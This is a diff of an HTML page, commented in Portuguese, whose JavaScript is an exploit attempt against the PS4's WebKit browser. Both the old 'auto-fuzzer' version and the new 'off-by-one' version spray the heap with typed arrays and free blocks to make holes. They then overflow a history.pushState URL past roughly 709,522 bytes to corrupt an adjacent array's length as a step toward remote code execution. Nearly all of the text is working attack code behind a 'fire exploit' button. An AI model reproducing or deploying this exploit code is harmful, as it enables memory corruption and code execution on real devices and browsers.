@@ -1,176 +1,137 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>PS4 WebKit: Auto-Fuzzer RCE</title>
+    <title>Danger Zone: Off-by-One Exploit</title>
     <style>
-        body { background-color: #0d1117; color: #58a6ff; font-family: 'Courier New', monospace; padding: 20px; }
-        .log-box { 
-            border: 1px solid #30363d; background: #161b22; 
-            height: 400px; overflow-y: scroll; padding: 10px; margin-top: 20px; 
-            font-size: 0.9em; white-space: pre-wrap;
-        }
-        button { 
-            background: #238636; color: #fff; border: none; padding: 10px 20px; 
-            font-size: 1.1em; cursor: pointer; font-weight: bold; margin-right: 10px;
-        }
-        button:hover { background: #2ea043; }
-        button.stop { background: #da3633; }
-        .highlight { color: #f0883e; font-weight: bold; }
-        .success { color: #00ff00; font-weight: bold; background: rgba(0,255,0,0.1); }
-        .info { color: #8b949e; }
+        body { background-color: #220000; color: #ff3333; font-family: monospace; padding: 20px; }
+        .log { border: 1px solid #ff0000; background: #000; padding: 10px; height: 300px; overflow-y: scroll; }
+        button { background: #ff0000; color: #fff; border: none; padding: 15px; font-weight: bold; cursor: pointer; font-size: 1.2em; }
+        button:hover { background: #cc0000; }
     </style>
 </head>
 <body>
-
-    <h1>Auto-Fuzzer: Heap Overflow (0x01)</h1>
-    <p>Target Base: 709,522 bytes | Strategy: Incremental Overflow</p>
+    <h1>OPERANDO NA ZONA DE CRASH (709.523+)</h1>
+    <p>Tentativa de estabilizar o Off-by-One em um Array vizinho.</p>
     
-    <div id="controls">
-        <button onclick="startFuzzing()">INICIAR FUZZING AUTOMÁTICO</button>
-        <button class="stop" onclick="stopFuzzing()">PARAR</button>
-    </div>
-
-    <div class="log-box" id="logger">Aguardando comando...</div>
+    <button onclick="runDangerZone()">DISPARAR EXPLOIT (Risco de Crash Imediato)</button>
+    
+    <div id="logger" class="log"></div>
 
     <script>
-        // CONFIGURAÇÕES GERAIS
-        const BASE_SIZE = 709522; // O tamanho "seguro" reportado
-        const CHUNK_SIZE = 0x1000; // Tamanho dos nossos arrays alvo (4KB)
+        const logArea = document.getElementById('logger');
+        function log(msg) { 
+            logArea.innerHTML += `<div>> ${msg}</div>`; 
+            logArea.scrollTop = logArea.scrollHeight;
+        }
+
+        // TAMANHO CRÍTICO
+        const SAFE_SIZE = 709522;
         
-        // LISTA DE VARIAÇÕES DE OVERFLOW (Bytes extras a escrever)
-        // Tentamos acertar o cabeçalho do vizinho. Pode estar perto ou longe.
-        const ATTEMPTS = [
-            16, 32, 48, 64,      // Curta distância (Header imediato)
-            128, 256, 512,       // Média distância
-            1024, 2048, 4096,    // Longa distância
-            8192, 16384, 32000   // Agressivo (Alta chance de crash)
-        ];
+        // Aqui entramos na zona de perigo. 
+        // 1 byte extra = Off-by-one.
+        // Se 1 não funcionar, tentamos avançar alguns bytes para pular metadados do jemalloc.
+        // Vamos testar +1, depois +16 (próximo alinhamento de 16 bytes), etc.
+        const DANGER_OFFSET = 1; 
 
-        let isRunning = false;
-        let currentStage = 0;
-        let arrays = []; // Armazena nossos alvos
-        let logger = document.getElementById('logger');
+        var arrays = [];
 
-        function log(msg, type='') {
-            let div = document.createElement('div');
-            div.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
-            if(type === 'success') div.className = 'success';
-            if(type === 'info') div.className = 'info';
-            logger.appendChild(div);
-            logger.scrollTop = logger.scrollHeight;
-        }
-
-        function stopFuzzing() {
-            isRunning = false;
-            log("Fuzzing interrompido pelo usuário.", 'info');
-        }
-
-        async function startFuzzing() {
-            if(isRunning) return;
-            isRunning = true;
-            currentStage = 0;
-            log("Iniciando bateria de testes...", 'highlight');
-            runNextStage();
-        }
-
-        // Função de pausa para não travar a UI
-        const sleep = ms => new Promise(r => setTimeout(r, ms));
-
-        async function runNextStage() {
-            if (!isRunning) return;
-            if (currentStage >= ATTEMPTS.length) {
-                log("Fim dos testes. Nenhuma corrupção detectada sem crash.", 'highlight');
-                log("Sugestão: Recarregue a página para limpar o Heap e tente de novo.");
-                isRunning = false;
-                return;
+        function runDangerZone() {
+            log("1. Preparando Heap Spray Massivo...");
+            
+            // FASE 1: SPRAY
+            // Criamos milhares de arrays pequenos. 
+            // O objetivo é forçar o alinhamento perfeito.
+            for (let i = 0; i < 5000; i++) {
+                // Tamanho 0x1000 é padrão para cair em buckets previsíveis
+                let arr = new Uint32Array(0x1000); 
+                arr[0] = i; // Marcador de índice
+                arr[1] = 0xDEADBEEF; // Marcador visual
+                arrays.push(arr);
             }
 
-            let overflowSize = ATTEMPTS[currentStage];
-            log(`\n--- TENTATIVA ${currentStage + 1}/${ATTEMPTS.length} ---`, 'highlight');
-            log(`Testando Overflow de: ${overflowSize} bytes (Total: ${BASE_SIZE + overflowSize})`);
+            // FASE 2: CRIAR O BURACO PERFEITO
+            // Precisamos de um buraco onde caiba EXATAMENTE o nosso buffer de 709522 bytes.
+            // Se o buraco for muito grande, sobra espaço antes do próximo array e não acertamos nada.
+            // Se for muito pequeno, o pushState aloca em outro lugar.
+            
+            log("2. Cavando buracos no Heap...");
+            
+            // Estratégia de "Swiss Cheese": Removemos arrays em posições estratégicas
+            // Tentamos liberar blocos contíguos para somar ~709kb
+            // Um array de 0x1000 tem 4096 bytes.
+            // 709522 / 4096 = ~173 arrays.
+            // Precisamos liberar ~173 arrays seguidos para criar um buraco desse tamanho.
+            
+            // Vamos tentar criar 5 "zonas de pouso"
+            for(let zone=0; zone < 5; zone++) {
+                let start = 1000 + (zone * 300);
+                let end = start + 174; // Libera um pouco a mais que o necessário
+                
+                for(let i = start; i < end; i++) {
+                    arrays[i] = null; // Libera memória
+                }
+            }
+
+            log("3. Aguardando Garbage Collector...");
+            // Pequeno delay para o sistema processar os buracos
+            setTimeout(executePayload, 500);
+        }
+
+        function executePayload() {
+            log(`4. INJETANDO PAYLOAD (${SAFE_SIZE} + ${DANGER_OFFSET} bytes)...`);
+            log("Se o console desligar agora, foi um 'Bad Crash' (Metadados).");
+            log("Se sobreviver, cheque se houve 'Good Corruption'.");
 
             try {
-                // 1. LIMPEZA (Tenta limpar o lixo da tentativa anterior)
-                arrays = []; 
-                if(window.gc) window.gc(); // Se tiver gc exposto (raro)
+                // Base segura
+                let base = "A".repeat(SAFE_SIZE);
                 
-                // 2. HEAP SPRAY (Preparar o terreno)
-                // Criamos arrays Uint32. Queremos que um deles fique logo depois do nosso payload.
-                log("Alocando Spray de Arrays...", 'info');
-                for (let i = 0; i < 2000; i++) {
-                    let arr = new Uint32Array(CHUNK_SIZE / 4);
-                    arr[0] = 0x13371337; // Marcador
-                    arr[1] = i;          // Índice
-                    arrays.push(arr);
-                }
-
-                // 3. CRIAR BURACOS (Swiss Cheese)
-                // Removemos arrays alternados para criar espaços livres onde o pushState pode cair
-                // Se o pushState cair num buraco, o overflow vai acertar o array vizinho.
-                log("Criando buracos no Heap...", 'info');
-                for (let i = 0; i < arrays.length; i += 2) {
-                    arrays[i] = null; // Libera
-                }
-
-                // Espera o Garbage Collector rodar (tentativa)
-                await sleep(100);
-
-                // 4. PREPARAR PAYLOAD
-                // Base segura + Overflow de 0x01
-                let baseStr = "A".repeat(BASE_SIZE);
-                let overflowStr = "\x01".repeat(overflowSize);
-                let finalPayload = "/" + baseStr + overflowStr; // '/' as vezes ajuda no parsing de URL
-
-                // 5. DISPARAR O GATILHO
-                log(`Injetando payload via history.pushState...`);
+                // O Byte Assassino
+                // Usamos 0x00 ou 0x80 para tentar não quebrar flags de metadados,
+                // ou 0x01 se quisermos somar tamanho.
+                // Vamos tentar sobrescrever com algo alto para garantir visibilidade.
+                let overflow = "\x01".repeat(DANGER_OFFSET);
                 
-                // Usamos um objeto vazio e um título aleatório para evitar cache
-                history.pushState({}, "fuzz_" + overflowSize, finalPayload);
+                let payload = base + overflow;
 
-                // 6. VERIFICAÇÃO (A Mágica)
-                let success = checkCorruption();
-                
-                if (success) {
-                    log("PROCESSO PARADO: Exploit encontrado!", 'success');
-                    isRunning = false;
-                    return;
-                } else {
-                    log("Falha: Nenhum array foi alterado.", 'info');
-                }
+                // DISPARO
+                history.pushState({}, "danger", payload);
 
-            } catch (e) {
-                log(`ERRO CRÍTICO (Pode ser bom se for crash): ${e.message}`, 'highlight');
+                // CHECAGEM IMEDIATA
+                checkResult();
+
+            } catch(e) {
+                log("Erro na injeção: " + e.message);
             }
-
-            // Prepara para a próxima iteração
-            currentStage++;
-            await sleep(500); // Pausa para respirar
-            runNextStage();
         }
 
-        function checkCorruption() {
-            // Percorre os arrays sobreviventes
-            for (let i = 0; i < arrays.length; i++) {
+        function checkResult() {
+            let success = false;
+            // Verifica apenas os arrays que não foram deletados
+            for(let i=0; i < arrays.length; i++) {
                 let arr = arrays[i];
-                if (!arr) continue;
-
-                // Checa se o tamanho mudou
-                // O tamanho original é CHUNK_SIZE / 4 (1024)
-                if (arr.length !== (CHUNK_SIZE / 4)) {
-                    log("!!! SUCESSO !!!", 'success');
-                    log(`Array no índice ${i} foi corrompido!`, 'success');
-                    log(`Tamanho Original: ${CHUNK_SIZE/4}`, 'success');
-                    log(`Novo Tamanho: ${arr.length} (0x${arr.length.toString(16)})`, 'success');
-                    
-                    document.body.style.backgroundColor = "#003300";
-                    alert(`RCE PRIMITIVE FOUND!\nOverflow Size: ${ATTEMPTS[currentStage]}\nTarget Index: ${i}`);
-                    return true;
+                if(arr) {
+                    // O tamanho normal é 4096 (0x1000)
+                    if(arr.length !== 4096) {
+                        log("!!! SUCESSO CRÍTICO !!!");
+                        log(`Array ${i} corrompido!`);
+                        log(`Novo tamanho: ${arr.length}`);
+                        log("RCE ESTÁ ABERTO.");
+                        success = true;
+                        
+                        document.body.style.backgroundColor = "#00ff00";
+                        document.body.style.color = "#000";
+                        break;
+                    }
                 }
             }
-            return false;
-        }
 
+            if(!success) {
+                log("Falha: Arrays intactos.");
+                log("O buraco não estava alinhado ou o byte atingiu padding inútil.");
+                log("Tente recarregar para mudar o layout da memória.");
+            }
+        }
     </script>
 </body>
 </html>
